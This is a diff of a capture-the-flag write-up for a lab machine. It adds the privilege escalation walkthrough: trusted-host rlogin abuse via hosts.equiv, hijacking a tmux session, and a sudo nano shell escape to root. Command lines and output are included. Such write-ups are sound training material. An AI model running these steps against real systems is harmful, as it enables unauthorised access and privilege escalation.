@@ -10,9 +10,8 @@ Let’s start our journey by performing enumeration with nmap scan.
 ```
 sudo nmap -sC -sV -A 10.129.234.130 -p-
 ```
+![643788](https://github.com/user-attachments/assets/b2916b15-4cd8-4aa6-a3d7-e011a03b8542)
 
-
-<img width="730" height="753" alt="Screenshot 2026-01-06 at 20-28-13 Document 1-3 pdf" src="https://github.com/user-attachments/assets/7a9ee140-228b-4432-ac8d-e2006856af03" /><br>
 We found:<br>
 Open SSH on port 22 -> Nothing interesting for now without creds. or identity file  
 HTTP on port 80 -> Apache with admin panel, potential attack vector<br>
@@ -50,7 +49,7 @@ But they are empty...
 
 Let’s dig more!
 
-<img width="747" height="300" alt="Screenshot 2026-01-06 at 20-49-33 Document 1-4 pdf" src="https://github.com/user-attachments/assets/2dd9bcd8-4140-40ce-8d20-72c650f0f4a6" />
+![97696](https://github.com/user-attachments/assets/043f9fd4-3c78-415f-bff6-f44209425d72)
 
 In request, we can spot this line: 
 ```
@@ -64,7 +63,7 @@ by reading apache log
 I found where the log is stored. We can try using this information
 for our advantage.
 
-[placeholder]
+![6547848](https://github.com/user-attachments/assets/fde749f6-d4ba-4216-ae1f-13ab12d057ac)
 
 Nice, it seems like this log is saving our agent. What it means? We can do log poisoning and receive reverse shell. 
 
@@ -98,5 +97,106 @@ Now, let's get better shell<br>
 $ python3 -c 'import pty;pty.spawn("/bin/bash")'
 www-data@reset:/var/www/html$ export TERM=xterm
 ```
+We can now grab the first flag, the user.txt in /home/sadm
+```
+www-data@reset:/var/www/html$ cat /home/sadm
+```
+After spending some time for searching clues and occasions for lateral movement/priv. escalation I found ‘hosts.equiv’ in /etc. 
+```
+www-data@reset:/var/www/html$ cat /etc/hosts.equiv 
+# /etc/hosts.equiv: list  of  hosts  and  users  that are granted "trusted" r
+#		    command access to your system .
+- root
+- local
++ sadm
+```
+This seems to be related to our previous nmap result. Maybe if we add the sadm user on our host, we'll be able to connect to the victim host. 
+```
+$ sudo apt install rsh-client
+$ sudo adduser sadm
+$ sudo su sadm
+$ rlogin 10.129.234.130
+sadm@reset:~$ whoami
+sadm
+```
+We’re in! Time to find the way to escalte to root.  
+After searching for a while i found opned tmux session on our host
+We can check what tmux is hidding from us!
+
+```
+sadm@reset:~$ ps aux
+<snip>
+root         949  0.0  0.5 317960 12056 ?        Ssl  12:09   0:00 /usr/sbin/ModemManager
+root         999  0.0  0.2   8568  4428 ?        Ss   12:09   0:02 /usr/sbin/inetd
+root        1002  0.0  0.1   6896  2916 ?        Ss   12:09   0:00 /usr/sbin/cron -f -P
+root        1017  0.0  0.0   6176  1076 tty1     Ss+  12:09   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
+root        1064  0.0  0.4  15440  9332 ?        Ss   12:09   0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
+sadm        1150  0.0  0.1   8796  3948 ?        Ss   12:09   0:00 tmux new-session -d -s sadm_session
+sadm        1157  0.0  0.2   8808  5560 pts/3    Ss   12:09   0:00 -bash
+root        1192  0.0  0.9 204368 19508 ?        Ss   12:09   0:02 /usr/sbin/apache2 -k start
+www-data    1221  0.0  0.8 205064 17460 ?        S    12:09   0:00 /usr/sbin/apache2 -k start
+www-data    1230  0.0  0.8 205072 17420 ?        S    12:09   0:00 /usr/sbin/apache2 -k start
+www-data    1231  0.0  0.8 205084 17400 ?        S    12:09   0:00 /usr/sbin/apache2 -k start
+<snip>
+sadm@reset:~$ tmux attach -t sadm_session
+```
+![754859](https://github.com/user-attachments/assets/6eab381a-e30f-4842-979f-5a6297445594)
+
+It look like password to me! But, let‘s check our sudo first 
+
+<img width="635" height="272" alt="Screenshot 2026-01-06 at 21-39-05 Document 1-4 pdf" src="https://github.com/user-attachments/assets/275e15e0-f41e-4e81-8d17-9aa59c8f588c" />
+
+Jackpot! I think we can now use firewall.sh to change our user to root. We’ll use nano to escalate our privileges.I’m gonna check GTFOBins to know how to do that properly
+```
+sudo nano
+^R^X
+reset; sh 1>&0 2>&0
+```
+We got root! Now, just claim your flag and enjoy your win 😊
+```
+rootelp                                           M-F New Buffer                                    ^S Spell Check                                    ^J Full Justify                                   ^V Cut Till End
+# .                                               M-\ Pipe Text                                     ^Y Linter                                         ^O Formatter                                      ^Z Suspend
+# .
+# .
+# .
+# .
+# .
+# .
+# .
+# .
+# .
+# .whoami
+sh: 12: .whoami: not found
+# whoami
+root
+# cat /root/root.txt
+cat: /root/root.txt: No such file or directory
+# cd /root
+# ls -la
+total 56
+drwx------  8 root root 4096 Jun  2  2025 .
+drwxr-xr-x 19 root root 4096 Jun  4  2025 ..
+lrwxrwxrwx  1 root root    9 Dec  6  2024 .bash_history -> /dev/null
+-rw-r--r--  1 root root 3106 Oct 15  2021 .bashrc
+drwx------  2 root root 4096 Jun  2  2025 .cache
+drwx------  3 root root 4096 Dec  6  2024 .config
+-rw-------  1 root root   20 Jun  2  2025 .lesshst
+drwxr-xr-x  3 root root 4096 Dec  6  2024 .local
+-rw-r--r--  1 root root  161 Jul  9  2019 .profile
+-rw-r-----  1 root root   33 Apr 10  2025 root_279e22f8.txt
+drwxrwxr-x  2 root root 4096 Jun  2  2025 .scripts
+-rw-r--r--  1 root root   66 Dec  6  2024 .selected_editor
+drwx------  3 root root 4096 Dec  6  2024 snap
+drwx------  2 root root 4096 Dec  6  2024 .ssh
+-rw-r--r--  1 root root    0 Feb  7  2025 .sudo_as_admin_successful
+-rw-r--r--  1 root root  165 Jun  2  2025 .wget-hsts
+# cat root_279e22f8.txt  
+7ad...
+```
+
+
+
+ 
+
 
 
